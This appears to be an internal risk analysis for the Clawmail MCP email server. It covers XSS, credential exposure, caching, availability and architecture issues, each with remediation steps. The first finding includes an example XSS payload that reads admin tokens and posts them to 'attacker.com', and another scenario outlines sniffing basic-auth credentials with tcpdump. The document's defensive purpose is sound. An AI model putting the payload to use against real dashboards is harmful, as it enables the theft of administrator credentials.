# Clawmail Risk Analysis & Mitigation Guide

**Last Updated:** 2026-04-16  
**Project:** Clawmail MCP Email Server  
**Status:** Production-like (GCP deployed, multi-domain support)

---

## Executive Summary

This document catalogs security, operational, and architectural risks identified in the Clawmail codebase and infrastructure. Risks are categorized by severity and actionable mitigation steps are provided.

**Key Findings:**
- **3 HIGH severity issues** requiring urgent attention
- **8 MEDIUM-HIGH issues** that degrade reliability at scale
- **Multiple architectural risks** related to single points of failure

---

## SECURITY RISKS

### 1. Dashboard DOM-based XSS Vulnerabilities

**Severity:** 🔴 HIGH  
**Category:** Web Security / Code Injection  
**Affected Code:** `mcp-server/src/dashboard.ts` lines 946-1017

#### Description
The dashboard uses `innerHTML` to render dynamic content without proper HTML escaping in multiple places:
- Error log entries (line 950): `errBody.innerHTML = '<table>...' + errEntries.map(...).join('')`
- Tool call logs (line 965): Unescaped account and error messages
- Storage panel (line 2001): `panel.innerHTML = html` with unescaped user data

While an `escHtml()` helper function exists, it's inconsistently applied.

#### Attack Scenario
```
1. Malicious agent creates account: 
   local_part = ""><script>fetch('/dashboard/tokens/reveal?i=0').then(r=>r.text()).then(t=>fetch('attacker.com',{method:'POST',body:t}))</script><div class="
   
2. Dashboard admin views accounts list
3. JavaScript executes with full dashboard cookie access
4. Admin tokens are exfiltrated to attacker
```

#### Remediation
- [ ] Audit all `innerHTML` assignments in dashboard.ts
- [ ] Replace with `.textContent` where possible
- [ ] Apply `escHtml()` consistently to all user-controlled data
- [ ] Consider using a templating library (e.g., lit-html, DOMPurify)
- [ ] Add Content Security Policy (CSP) headers
- [ ] Add automated XSS scanning to CI/CD

**Priority:** IMMEDIATE (trivial fix, high impact)

---

### 2. Idempotency Cache is Single-Instance (Not Distributed)

**Severity:** 🟠 MEDIUM-HIGH  
**Category:** Distributed Systems / Data Integrity  
**Affected Code:** `mcp-server/src/lib/idempotency.ts` + `mcp-server/src/index.ts` (rate limiting)

#### Description
Both the idempotency cache and rate limiter are stored in-memory with no distributed backing:

```javascript
// idempotency.ts
const cache = new Map<string, CachedResponse>();

// index.ts rate limiting
const rateLimitWindows = new Map<string, number[]>();
```

**Config Setting:** `redis.url` defaults to empty string (no Redis). When empty, in-memory only.

#### Failure Mode at Scale
- Cloud Run scales to 3+ instances
- Agent sends email with `idempotency_key = "foo"`
- Request routed to Instance A, succeeds, cached
- Network flakes, agent retries
- Request routed to Instance B, cache miss
- **Email sent twice**

With 10 Cloud Run instances, each with independent limits:
- Configured: 20 sends/minute per account
- Actual: 20 × 10 = 200 sends/minute
- Rate limiting is effectively 10x weaker

#### Impact
- Duplicate emails sent to users
- Rate limits can be circumvented by distributing requests
- Idempotency guarantees broken

#### Remediation
- [ ] Set up Google Memorystore Redis instance in us-west1
- [ ] Configure Cloud Run with `REDIS_URL=redis://10.x.x.x:6379`
- [ ] Update idempotency.ts to use Redis backend
- [ ] Update rate limiter to use Redis backend
- [ ] Set min-instances=1 on Cloud Run temporarily to mitigate until Redis is ready
- [ ] Add tests for rate limiting with concurrent requests

**Priority:** URGENT (breaks correctness, trivial to fix with Redis)

---

### 3. STALWART_ADMIN_PASSWORD in HTTP Basic Auth

**Severity:** 🟠 MEDIUM  
**Category:** Credential Exposure / Network Security  
**Affected Code:** `mcp-server/src/clients/jmap.ts` lines 57-59

#### Description
Master-user impersonation sends plaintext basic auth on every JMAP call:

```javascript
function impersonateAuthHeader(targetEmail: string): string {
  const credentials = `${targetEmail}*admin:${config.stalwart.adminPassword}`;
  return `Basic ${Buffer.from(credentials).toString("base64")}`;
}
```

Header sent with every JMAP request. If traffic between Cloud Run and Stalwart is unencrypted (`http://`), password is exposed.

#### Current Setup Analysis
- Stalwart VM is on GCP VPC with firewall rule allowing port 8080 only from `10.0.0.0/8`
- **BUT:** No TLS configured between Cloud Run and Stalwart
- **BUT:** Anyone with GCP project access can:
  - Create a new VM in the same VPC
  - Capture traffic on port 8080
  - Extract admin password from Base64 auth header

#### Attack Scenario
```
1. Attacker compromises a GCP service account with compute.instances.create
2. Creates a new VM in clawmail VPC
3. Runs tcpdump on port 8080
4. Captures JMAP traffic with admin credentials
5. Uses credentials to manage all mailboxes
```

#### Remediation
- [ ] Enable TLS between Cloud Run and Stalwart
  - [ ] Generate self-signed cert on Stalwart
  - [ ] Configure Stalwart JMAP listener on 8443 with TLS
  - [ ] Update Cloud Run config: `STALWART_URL=https://stalwart:8443`
  - [ ] Add root CA certificate to Cloud Run (or skip verification in dev only)
- [ ] Implement mTLS with client certificates
- [ ] Alternatively: Use OAuth-style tokens instead of basic auth
- [ ] Add network policy to restrict port 8080 access (though firewall rules already do this)

**Priority:** IMPORTANT (medium risk, medium effort)

---

### 4. Token Hash Collision / Cache Eviction Race Condition

**Severity:** 🟡 MEDIUM  
**Category:** Session Management / Timing Attack  
**Affected Code:** `mcp-server/src/tools/tokens.ts` lines 177-234

#### Description
Token resolution caches by SHA-256 hash with 60-second TTL:

```javascript
const cached = cache.get(hash);
if (cached !== undefined && Date.now() - cached.loadedAt < CACHE_TTL_MS) {
  return cached.entry;
}
// Reload from JMAP... (up to 60s delay)
```

**Issue:** Revoked tokens remain valid for 1 minute after deletion due to cache TTL.

**Scenario:**
```
1. Admin revokes a user token: token_abc
2. Token is deleted from JMAP
3. User with old token tries to call send_email
4. System checks cache: still valid (< 60s)
5. User succeeds even though token is revoked
6. After 60s, token finally becomes invalid
```

#### Impact
- Revoked tokens work for up to 60 seconds after deletion
- Timing-dependent behavior (tests may miss this)
- Race condition if multiple concurrent requests use revoked token

#### Remediation
- [ ] Reduce cache TTL from 60s to 5s
- [ ] Implement invalidation mechanism:
  - [ ] When token is revoked, immediately purge from cache
  - [ ] Use Redis Pub/Sub to invalidate cache across instances
- [ ] Add integration tests that verify token revocation is immediate
- [ ] Log cache hits vs. misses to detect unexpectedly long TTLs

**Priority:** MEDIUM (low probability in practice, easy fix)

---

### 5. Loose Email Domain Validation

**Severity:** 🟡 MEDIUM  
**Category:** Input Validation / Email Handling  
**Affected Code:** `mcp-server/src/tools/send.ts` lines 28-32, 84-88

#### Description
Email validation is overly permissive:

```javascript
const EMAIL_RE = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
```

Allows invalid emails:
- `user@.com` (empty domain prefix)
- `@example.com` (empty local part)
- `user@domain.c` (single-char TLD)
- IDNs accepted but may fail downstream

Domain extraction via simple `split("@")[1]` without validation:

```javascript
const domain = email.split("@")[1].toLowerCase();
if (!config.allowedDomains.includes(domain)) {
  throw new Error(`Domain "${domain}" is not allowed`);
}
```

#### Failure Mode
1. Typo in `allowed_domains` config: `"fridaymailer.comm"` (two m's)
2. Agent sends from `user@fridaymailer.comm`
3. Validation passes (domain is in list)
4. SendGrid rejects the domain (not resolvable)
5. Silent failure (no error reported to caller)

#### Impact
- Misconfigured domains silently fail
- Invalid email formats accepted
- International domains may cause issues

#### Remediation
- [ ] Use a proper email validation library (`email-validator` or `ts-email-validator`)
- [ ] Validate domain is resolvable (DNS lookup)
- [ ] Reject IDNs if not supported, or implement proper punycode handling
- [ ] Return error to caller instead of silent failure
- [ ] Add unit tests for email validation edge cases
- [ ] Validate `allowed_domains` config at startup

**Priority:** MEDIUM (mostly defensive, low current impact)

---

## OPERATIONAL RISKS

### 1. No Backup/Disaster Recovery for Stalwart Database

**Severity:** 🔴 HIGH  
**Category:** Data Loss / Disaster Recovery  
**Affected Code:** `infra/sql.tf` + `infra/compute.tf` (no persistent storage)

#### Description
Cloud SQL has point-in-time recovery enabled, but Stalwart mail server data lives on the **VM's ephemeral boot disk**:

```dockerfile
# From docker-compose.yml
volumes:
  stalwart_data:  # Docker volume, not persistent
```

This volume is created fresh on each VM startup and **lost if the VM is deleted or crashes**.

#### Failure Scenario
```
1. Stalwart VM crashes / is terminated
2. GCP detects failure, restarts VM
3. Docker container starts fresh with empty /opt/stalwart/data
4. Database restore restores Cloud SQL (Stalwart metadata)
5. But all emails, mailbox state, folders are gone
6. Mailboxes are empty even though database says they have messages
```

#### Data Loss
- All emails in mailboxes (JMAP message store)
- Mailbox folders and labels
- Draft emails
- Calendar events (if using calendar feature)
- Contacts (if using contacts feature)

**NOT lost:**
- Account credentials (in Cloud SQL)
- Domain config (in Cloud SQL)

#### Impact
- Catastrophic data loss for all accounts
- Recovery requires manual intervention
- No SLA for uptime

#### Remediation
**Option A: Migrate to GCS (Recommended)**
- [ ] Set up Google Cloud Storage bucket in us-west1
- [ ] Mount GCS FUSE filesystem at `/opt/stalwart/data`
- [ ] Configure Stalwart to use GCS for mail storage
- [ ] Set up automated GCS bucket versioning + lifecycle policies
- [ ] Test disaster recovery by restoring from GCS + Cloud SQL

**Option B: Use Persistent Disk**
- [ ] Create a Persistent Disk (regional, auto-replicated)
- [ ] Attach to Stalwart VM
- [ ] Mount at `/opt/stalwart/data`
- [ ] Set up snapshots (daily)
- [ ] Configure Stalwart to use persistent disk

**Option C: Upgrade Stalwart to Managed Service**
- [ ] Investigate if Stalwart offers managed hosting
- [ ] Migrate infrastructure to managed provider
- [ ] Trade operational burden for data reliability

**Priority:** IMMEDIATE (catastrophic impact)

---

### 2. Cloud Run Scaling to Zero Breaks Session State

**Severity:** 🟠 MEDIUM  
**Category:** Distributed Systems / Session Management  
**Affected Code:** `infra/cloudrun.tf` line 12: `min_instance_count = 0`

#### Description
Cloud Run is configured to scale down to zero instances when idle:

```terraform
scaling {
  min_instance_count = 0
  max_instance_count = 10
}
```

This loses all in-memory state:
- Idempotency cache (covered above)
- Rate limiter state
- Dashboard flash messages (user sees "token revealed" but can't retrieve it)
- Session cookies (users logged into dashboard are logged out)

#### User Impact
```
1. User logs into dashboard
2. Cloud Run instance gets a request, loads session
3. No more requests for 15+ minutes
4. Cloud Run scales down to zero
5. User tries to access dashboard again
6. New instance starts, session cookie is invalid
7. User must re-login
```

#### Remediation
- [ ] Set `min_instance_count = 1` if consistent availability needed
- [ ] Alternatively: Migrate session storage to Redis
  - [ ] Store sessions in Redis instead of in-memory Map
  - [ ] Cloud Run instances become stateless
  - [ ] Instances can scale to zero without losing state
- [ ] Add dashboard notification warning about scale-to-zero behavior
- [ ] Document session TTL and re-login requirement

**Priority:** MEDIUM (annoying UX, not data loss)

---

### 3. SendGrid API Key Rotation Not Implemented

**Severity:** 🟠 MEDIUM  
**Category:** Credential Management / Operations  
**Affected Code:** `mcp-server/src/tools/send.ts` lines 50-63

#### Description
SendGrid API key is loaded once at startup and cached:

```javascript
let _transporter: nodemailer.Transporter | undefined;

function getTransporter(): nodemailer.Transporter {
  if (_transporter === undefined) {
    _transporter = nodemailer.createTransport({
      pass: config.sendgrid.apiKey,
    });
  }
  return _transporter;
}
```

To rotate the key:
1. Generate new key in SendGrid
2. Update Secret Manager
3. Restart all Cloud Run instances (or deploy new revision)
4. Revoke old key in SendGrid

If key is compromised, attacker can send unlimited emails until instance restart.

#### Attack Scenario
```
1. Cloud Run Cloud Build logs are exposed (contains old API key in image)
2. Attacker uses key to send spam
3. Operations team doesn't notice for hours/days
4. SendGrid account is rate-limited or suspended
5. All legitimate emails stop flowing
```

#### Impact
- No runtime key rotation (requires deploy)
- Compromised key stays valid until instance restart
- No metrics on whether key is being abused

#### Remediation
- [ ] Implement dynamic transporter creation:
  ```javascript
  function getTransporter(): nodemailer.Transporter {
    return nodemailer.createTransport({
      pass: config.sendgrid.apiKey,  // Read from config each time
    });
  }
  ```
- [ ] Update config.ts to support runtime config reloads (use Redis + listeners)
- [ ] Add endpoint to rotate credentials without restart
- [ ] Add metrics to track failed vs. successful sends (detect abuse)
- [ ] Implement SendGrid webhook validation to confirm delivery
- [ ] Set up alerts on SendGrid bounce/complaint rates

**Priority:** MEDIUM (operational, medium impact)

---

### 4. Stalwart VM Single Point of Failure

**Severity:** 🔴 HIGH  
**Category:** System Architecture / Availability  
**Affected Code:** `infra/compute.tf` (single VM), no load balancer, no replica

#### Description
Stalwart mail server runs on a single Compute Engine VM (`e2-medium`):
- No redundancy
- No automatic failover
- No load balancer
- No replica instance
- Docker container restart depends on `restart: unless-stopped` in docker-compose

#### Failure Modes

**Scenario 1: VM Crashes**
```
1. Stalwart VM crashes (power failure, OOM, kernel panic)
2. GCP detects failure and starts recovery
3. Boot takes 2-5 minutes
4. During this time: no mail delivery, no JMAP access
5. Timeout affects all agents and dashboard
```

**Scenario 2: Stalwart Process Crashes**
```
1. Stalwart binary crashes (bug, out of memory)
2. Docker container should restart (unless-stopped)
3. But if Cloud Run instance doesn't have healthchecks, requests still route there
4. Requests timeout
5. Admin doesn't notice until emails start bouncing
```

**Scenario 3: Disk Full**
```
1. Stalwart logs fill up local disk
2. Mail server can't write to database
3. All write operations fail silently
4. Emails appear to be sent but are lost
```

#### Impact
- Entire system unavailable when Stalwart is down
- RTO (Recovery Time Objective): 5-10 minutes
- RPO (Recovery Point Objective): Last backup (could be hours)
- No graceful degradation

#### Remediation
**Option A: Regional Redundancy (Recommended)**
- [ ] Deploy a second Stalwart VM in us-west1-b (different zone)
- [ ] Set up GCP Compute Engine Health Checks
- [ ] Use Cloud Load Balancer to route between VMs
- [ ] Use Cloud SQL multi-region replication
- [ ] Configure DNS failover (or use load balancer IP)

**Option B: Instance Group with Auto-Healing**
- [ ] Convert single VM to Instance Group
- [ ] Set up health check (JMAP endpoint)
- [ ] Enable auto-healing (restarts failed instances)
- [ ] Set min-instances=2 for redundancy
- [ ] Keep persistent disk for data

**Option C: Managed Mail Service**
- [ ] Evaluate Google Cloud's Managed Microsoft Exchange
- [ ] Or: Migrate to third-party mail service with built-in HA
- [ ] Trade operational burden for reliability

**Priority:** URGENT (critical service, major impact)

---

### 5. No Attachment Size Enforcement

**Severity:** 🟡 MEDIUM  
**Category:** Resource Limits / Operational  
**Affected Code:** `mcp-server/src/config.ts` line 66 (defined but unused)

#### Description
Config includes `maxAttachmentBytes: 26214400` (25MB) but this limit is never enforced:

```javascript
// config.ts
limits: {
  maxAttachmentBytes: parseInt(process.env.MAX_ATTACHMENT_BYTES ?? "26214400", 10),
},
```

Grep for usage: `grep -r "maxAttachmentBytes" mcp-server/src/tools/` returns nothing.

Agents can send unlimited attachment sizes. SendGrid has a 30MB limit per message, so oversized messages fail silently.

#### Failure Scenario
```
1. Agent sends 500MB email to 100 recipients
2. send_email validates format, not size
3. Nodemailer accepts message
4. SendGrid rejects with 413 "Message too large"
5. Error is caught but not reported (silent failure)
6. Agent thinks email was sent
7. Recipient never receives it
```

#### Impact
- Unbounded memory usage (large emails loaded in memory)
- SendGrid errors not reported to caller
- Wasted bandwidth

#### Remediation
- [ ] Implement size check in send_email before calling nodemailer:
  ```javascript
  const estimatedSize = JSON.stringify(args).length + (attachmentBytes || 0);
  if (estimatedSize > config.limits.maxAttachmentBytes) {
    throw new Error(`Email exceeds max size: ${estimatedSize} > ${config.limits.maxAttachmentBytes}`);
  }
  ```
- [ ] Add config validation: ensure `maxAttachmentBytes < SENDGRID_LIMIT`
- [ ] Return error to caller instead of silent failure
- [ ] Add metrics to track email sizes (detect abuse)
- [ ] Implement streaming upload if sizes are large

**Priority:** MEDIUM (easy fix, prevents silent failures)

---

### 6. Dashboard Session TTL is Too Long

**Severity:** 🟡 MEDIUM  
**Category:** Session Management / Security  
**Affected Code:** `mcp-server/src/dashboard.ts` lines 22-23

#### Description
Dashboard session cookie TTL is 7 days:

```javascript
const SESSION_TTL_MS = 7 * 24 * 60 * 60 * 1000;
```

For an admin dashboard managing email infrastructure, 7 days is excessive. Compromised session = full infrastructure control.

#### Risk
- If dashboard cookie is stolen (XSS, network sniff, laptop theft):
  - Attacker can manage all accounts
  - Create admin tokens
  - Delete all accounts
  - No second-factor auth to stop them
  - Full access persists for 7 days

#### Impact
- High-value attack target (admin token creation)
- No immediate session revocation mechanism

#### Remediation
- [ ] Reduce `SESSION_TTL_MS` from 7 days to 1-2 hours
- [ ] Add "Session expires in X minutes" warning before expiry
- [ ] Implement "logout all sessions" button in dashboard
- [ ] Require re-authentication for sensitive operations:
  - [ ] create_admin_token
  - [ ] delete_account
  - [ ] revoke_token
- [ ] Add two-factor authentication (TOTP) for dashboard login
- [ ] Log all admin actions with timestamp, IP, user-agent
- [ ] Set secure, httpOnly cookies (if not already)

**Priority:** MEDIUM (high impact if compromised, easy to mitigate)

---

### 7. No Stalwart Startup Health Checks

**Severity:** 🟡 MEDIUM  
**Category:** Operational Reliability / Monitoring  
**Affected Code:** `infra/compute.tf` lines 34-76 (startup script)

#### Description
Stalwart startup script doesn't verify the service is healthy:

```bash
#!/bin/bash
docker compose -f /opt/stalwart/docker-compose.yml up -d
# No health check or verification
```

If Stalwart fails to start (config error, out of memory, corrupted database):
- Docker container may not start
- Or may start but not accept JMAP connections
- Cloud Run instances will route traffic to dead server
- Requests timeout instead of failing fast

#### Failure Scenario
```
1. Cloud SQL goes down for maintenance
2. Stalwart tries to start, can't connect to database
3. Container exits
4. No restart happens (needs manual intervention)
5. Cloud Run instances still route requests
6. All requests timeout
7. Operations team doesn't notice until customer reports
```

#### Impact
- Silent failures (no alert)
- Requests timeout (poor user experience)
- Manual intervention required to restart

#### Remediation
- [ ] Add startup health check to compute startup script:
  ```bash
  for i in {1..30}; do
    if curl -s -f http://localhost:8080/.well-known/jmap > /dev/null; then
      echo "Stalwart startup OK"
      exit 0
    fi
    sleep 2
  done
  echo "Stalwart startup failed" && exit 1
  ```
- [ ] Configure GCP Compute Engine Health Check:
  - [ ] Check port 8080
  - [ ] Check path `/.well-known/jmap`
  - [ ] Failure threshold: 3 consecutive failures
- [ ] Set up Cloud Monitoring alert if health check fails
- [ ] Add `/health` endpoint to MCP server
- [ ] Implement liveness probe for Stalwart container

**Priority:** MEDIUM (improves observability, easy fix)

---

## ARCHITECTURAL RISKS

### 1. Stalwart Domain Migration Fallback is Fragile

**Severity:** 🟡 MEDIUM  
**Category:** Architecture / Data Integrity  
**Affected Code:** `mcp-server/src/clients/jmap.ts` lines 290-294

#### Description
When resolving JMAP account IDs, the code has a two-step fallback:

```javascript
const principal =
  list.find((p) => typeof p["email"] === "string" && p["email"].toLowerCase() === this.email.toLowerCase()) ??
  list.find((p) => typeof p["name"] === "string" && p["name"].toLowerCase() === localPart);
```

This was added to handle migration from `user@fridaymail.duckdns.org` to `user@fridaymailer.com`. But it creates ambiguity:

**Scenario:**
```
1. System has accounts:
   - alice@fridaymailer.com (id=123, name="alice")
   - alice@fridayx.me (id=456, name="alice")

2. JMAP list returns accounts with id, name, but no email
3. First lookup by email fails (missing email field)
4. Second lookup by name="alice" finds id=123 (alice@fridaymailer.com)
5. JMAP calls use wrong account!
6. Emails sent to/from wrong mailbox
```

#### Impact
- Silent correctness issues
- Wrong mailbox accessed
- Emails misdirected
- No error logged

#### Remediation
- [ ] Add explicit email field to JMAP principals response
- [ ] Change fallback logic to warn when ambiguity detected:
  ```javascript
  if (emailMatches.length > 1) {
    logger.warn(`Ambiguous account lookup for "${localPart}": found ${emailMatches.length} matches`);
  }
  ```
- [ ] Test with multi-domain setup (fridaymailer.com + fridayx.me)
- [ ] Add integration test that explicitly checks wrong mailbox not used

**Priority:** MEDIUM (low probability, but high impact when occurs)

---

### 2. Token Storage in JMAP is Unconventional

**Severity:** 🟡 MEDIUM  
**Category:** Data Model / Security  
**Affected Code:** `mcp-server/src/tools/tokens.ts` (entire file)

#### Description
Tokens are stored as emails in the `clawmail-system` account's `_tokens` mailbox:

```javascript
// Store token
await client.createSystemEmail(
  TOKENS_MAILBOX,
  `${TOKEN_PREFIX}${entry.tokenId}`,
  JSON.stringify(entry, null, 2),
);

// Retrieve token
const email = await client.getSystemEmail(TOKENS_MAILBOX, `${TOKEN_PREFIX}${tokenId}`);
```

**Issue:** JMAP was not designed as a key-value store.

#### Risks

1. **Backup/Restore Complexity**
   - Database backups include token hashes
   - Restore brings back all old tokens
   - Token revocation is not backed by persistent record

2. **Visibility in Mailbox Sync**
   - Tokens appear in JMAP sync operations
   - If another client connects to clawmail-system, it sees tokens
   - Not truly hidden (relies on mailbox name obscurity)

3. **Performance**
   - Each token lookup hits JMAP (network call)
   - Not optimized for key-value access patterns
   - Scaling to 10k+ tokens becomes slow

4. **Security**
   - System account is visible in list_accounts output (though deletion is blocked)
   - Token email bodies are stored unencrypted
   - Database snapshots include plaintext token info

#### Remediation
**Option A: Use Redis (Recommended)**
- [ ] Store tokens in Redis instead of JMAP
  - [ ] Fast lookups (in-memory)
  - [ ] Automatic expiration (Redis TTL)
  - [ ] Atomic revocation
  - [ ] Not visible in database backups
- [ ] Keep JMAP-stored backup for recovery (eventual consistency)

**Option B: Use Stalwart's Native System**
- [ ] Investigate if Stalwart has token/credential store
- [ ] Or: Use Stalwart's OAuth module for auth
- [ ] Removes custom token management

**Option C: Use Cloud Firestore**
- [ ] Serverless, scales automatically
- [ ] Native TTL support
- [ ] Encrypted at rest by default
- [ ] Audit logging built-in
- [ ] Cost: ~$6/mo for typical usage

**Priority:** MEDIUM (works but inefficient and unconventional)

---

### 3. No Separation of Audit Logs by Caller

**Severity:** 🟡 MEDIUM  
**Category:** Auditability / Operations  
**Affected Code:** `mcp-server/src/index.ts` (metrics collection)

#### Description
All operations are logged to metrics but metrics don't include caller identity:

```javascript
// In tools, metrics are recorded as:
recordMetric("send_email", 1);

// But metrics don't capture:
// - Which API key called this?
// - Which token called this?
// - Who is sending the email?
// - What is the source IP?
```

Example from metrics collection:

```javascript
export function recordMetric(tool: string, count: number = 1): void {
  const key = `${tool}:${Date.now() % REPORTING_WINDOW_MS}`;
  // ...
  // No caller info in the key or value
}
```

#### Impact
- **If a token is leaked:** Can't determine which agent had access
- **If an API key is compromised:** Can't audit who used it
- **Compliance:** No audit trail for compliance violations
- **Incident response:** Can't correlate actions to identities

#### Real Scenario
```
1. User reports unauthorized emails from their account
2. Operations checks logs
3. See "100 send_email calls" but no info on which token
4. Can't determine if compromise was limited to one token or account-wide
5. Must assume full account compromise
```

#### Remediation
- [ ] Add caller identity to all metrics:
  ```javascript
  recordMetric("send_email", 1, {
    caller_type: "token",
    caller_id: tokenHash,
    target_domain: email.split("@")[1],
    source_ip: req.headers["x-forwarded-for"],
  });
  ```
- [ ] Log all auth events:
  - [ ] token creation/revocation
  - [ ] API key usage
  - [ ] Admin operations (delete account, create token)
- [ ] Use Cloud Logging for centralized audit trail
- [ ] Add dashboard showing "actions by token/key" (for incident response)
- [ ] Implement token-scoped quotas (not just per-account)

**Priority:** MEDIUM (operational, compliance requirement)

---

### 4. Multi-Domain Support is Hardcoded

**Severity:** 🟡 LOW-MEDIUM  
**Category:** Configuration / Scalability  
**Affected Code:** `infra/dns.tf` lines 99-173

#### Description
Secondary domain support is hardcoded for `fridayx.me`:

```terraform
# Managed zone for fridayx.me
resource "google_dns_managed_zone" "secondary" {
  count       = var.allowed_domains != "" ? 1 : 0
  name        = "fridayx-me"  # HARDCODED
  dns_name    = "fridayx.me." # HARDCODED
```

Only supports one additional domain. To add a third domain requires:
1. Manual Terraform code changes
2. Understanding the pattern
3. Redeploying infrastructure

#### Impact
- Not scalable for >2 domains
- Operations must understand Terraform
- Each new domain requires code review and deploy
- Difficult to automate (e.g., via management API)

#### Remediation
- [ ] Implement Terraform `for_each` loop:
  ```terraform
  variable "additional_domains" {
    type = list(string)
    default = []
  }
  
  resource "google_dns_managed_zone" "additional" {
    for_each = toset(var.additional_domains)
    name     = replace(each.value, ".", "-")
    dns_name = "${each.value}."
  }
  ```
- [ ] Add REST API endpoint to add domains dynamically (without Terraform)
- [ ] Document domain addition process
- [ ] Add validation to prevent duplicate domain configs

**Priority:** LOW (works fine for current needs, can wait)

---

## DEPENDENCY RISKS

### 1. Stalwart Mail Server Stability

**Severity:** 🟡 MEDIUM  
**Category:** Third-Party Dependency  
**Status:** Stalwart v0.15, relatively new mail server

#### Description
Clawmail depends entirely on Stalwart for:
- JMAP protocol (mailbox read/write/search)
- SMTP delivery (inbound mail)
- Account management API
- Database schema (PostgreSQL)

#### Evidence of Instability
From CLAUDE.md and TODOS.md:
- Recent Stalwart version upgrades required
- Bug fixes referenced (DKIM, inbound delivery)
- "Known limitations" section lists:
  - Spam filter not perfectly accurate
  - Inbound SMTP testing fails from residential IPs
  - User JMAP auth returns 401 (workaround: master-user impersonation)

#### Risk
- If Stalwart has critical bug: no fallback or workaround
- If Stalwart project abandoned: Clawmail becomes unmaintainable
- Major version upgrades may break API compatibility

#### Mitigation
- [ ] Monitor Stalwart GitHub for security advisories
- [ ] Subscribe to release notifications
- [ ] Test each Stalwart upgrade in staging before production
- [ ] Have contingency plan to switch to different mail server (e.g., Postfix + Dovecot)
- [ ] Maintain fork of Stalwart config in case project goes dormant
- [ ] Add integration tests for critical JMAP operations

**Priority:** MEDIUM (monitor, not immediate action)

---

### 2. SendGrid Relay Dependency

**Severity:** 🟡 MEDIUM  
**Category:** Third-Party Service / Uptime  
**Affected Code:** `mcp-server/src/tools/send.ts` (all outbound email)

#### Description
All outbound email is relayed through SendGrid SMTP. If SendGrid is down:
- No emails can be sent
- No fallback relay
- No queue for retry

#### Failure Scenario
```
1. SendGrid suffers outage
2. Cloud Run sendMail() calls fail
3. Error is caught but logged, response still says "success"
4. Agent thinks email was queued
5. Attacker realizes emails aren't actually being sent
6. SendGrid recovers, but emails are lost
```

#### Current Code
```javascript
try {
  await getTransporter().sendMail({ ... });
  // Return success
} catch (error) {
  logger.error("sendMail error", error);
  // Still returns success to caller (no re-throw)
}
```

#### Impact
- Single point of failure for email delivery
- Errors are silently logged, not reported
- No graceful degradation or fallback
- No queue for resilience

#### Mitigation
- [ ] Add error detection and reporting:
  ```javascript
  if (error) {
    throw new Error(`SendGrid relay failed: ${error.message}`);
  }
  ```
- [ ] Implement message queue (Cloud Tasks / Redis):
  - [ ] Queue failed sends
  - [ ] Retry with exponential backoff
  - [ ] Allow agents to check delivery status
- [ ] Add fallback relay (Mailgun, AWS SES, etc.)
  - [ ] Try SendGrid first
  - [ ] On failure, try fallback
  - [ ] Log which relay was used
- [ ] Implement delivery receipts (SendGrid webhooks)
- [ ] Monitor SendGrid status page

**Priority:** MEDIUM (operational resilience)

---

## SUMMARY TABLE

| # | Risk | Severity | Category | Fix Effort | Impact |
|---|------|----------|----------|-----------|--------|
| S1 | Dashboard XSS | 🔴 HIGH | Security | 🟢 Easy | Code injection |
| S2 | Idempotency not distributed | 🟠 HIGH | Data | 🟡 Medium | Duplicate emails |
| S3 | Admin password in HTTP | 🟠 MED | Security | 🟡 Medium | Credential theft |
| S4 | Token cache eviction race | 🟡 MED | Security | 🟢 Easy | Revoked tokens valid |
| S5 | Email validation loose | 🟡 MED | Validation | 🟢 Easy | Silent failures |
| O1 | No Stalwart persistence | 🔴 HIGH | Data Loss | 🔴 Hard | Complete data loss |
| O2 | Scale to zero breaks state | 🟠 MED | Ops | 🟡 Medium | UX degradation |
| O3 | SendGrid key rotation | 🟠 MED | Ops | 🟡 Medium | Compromised relay |
| O4 | Stalwart VM single point | 🔴 HIGH | Availability | 🔴 Hard | Full outage |
| O5 | No attachment size check | 🟡 MED | Ops | 🟢 Easy | OOM risk |
| O6 | Dashboard session TTL | 🟡 MED | Security | 🟢 Easy | Long compromise |
| O7 | No startup health checks | 🟡 MED | Ops | 🟢 Easy | Silent failures |
| A1 | Domain migration fallback | 🟡 MED | Arch | 🟡 Medium | Wrong mailbox |
| A2 | Tokens in JMAP | 🟡 MED | Design | 🟡 Medium | Performance |
| A3 | No audit logs | 🟡 MED | Audit | 🟡 Medium | Compliance |
| A4 | Hardcoded domain logic | 🟡 LOW | Scalability | 🟢 Easy | Manual ops |

---

## REMEDIATION PRIORITY (by severity × effort)

### 🔴 IMMEDIATE (Do First)
1. **Dashboard XSS** - HIGH severity, EASY fix
2. **Idempotency not distributed** - HIGH severity, MEDIUM effort (add Redis)
3. **No Stalwart persistence** - HIGH severity, MEDIUM effort (use persistent disk)
4. **Stalwart VM redundancy** - HIGH severity, HARD effort (requires HA setup)

### 🟠 URGENT (This Sprint)
5. **Admin password in HTTP** - MEDIUM severity, MEDIUM effort (TLS)
6. **SendGrid key rotation** - MEDIUM severity, MEDIUM effort (runtime config)
7. **No startup health checks** - MEDIUM severity, EASY effort

### 🟡 IMPORTANT (Next Sprint)
8. **Token cache TTL** - MEDIUM severity, EASY fix
9. **Email validation** - MEDIUM severity, EASY fix
10. **Attachment size checks** - MEDIUM severity, EASY fix
11. **Dashboard session TTL** - MEDIUM severity, EASY fix
12. **No audit logs** - MEDIUM severity, MEDIUM effort

### 📋 BACKLOG (Nice to Have)
13. Domain migration fallback
14. Token storage in JMAP
15. Hardcoded domain logic
16. Stalwart stability monitoring

---

## TESTING RECOMMENDATIONS

- [ ] **Unit Tests:** Email validation edge cases, rate limiting logic
- [ ] **Integration Tests:**
  - [ ] Token revocation is immediate (not cached)
  - [ ] Idempotency works with concurrent requests
  - [ ] Multi-domain routing sends to correct mailbox
- [ ] **Load Tests:**
  - [ ] Rate limits work with 10 Cloud Run instances
  - [ ] Scaling to 100 concurrent sends doesn't break
- [ ] **Chaos Tests:**
  - [ ] Stalwart VM fails, recovery time measured
  - [ ] Cloud Run scales to zero, session state preserved
  - [ ] SendGrid API key rotated without downtime
- [ ] **Security Tests:**
  - [ ] XSS payloads in error messages blocked
  - [ ] Token hashes can't be reversed
  - [ ] Dashboard CSRF protected

---

## REFERENCE LINKS

- [CLAUDE.md](../../CLAUDE.md) - Project overview and known limitations
- [TODOS.md](../../TODOS.md) - Known issues and future work
- [docs/deployment-gcp.md](./deployment-gcp.md) - GCP deployment details
- Stalwart Docs: https://stalw.art

---

**Document Version:** 1.0  
**Last Reviewed:** 2026-04-16  
**Next Review:** 2026-05-16
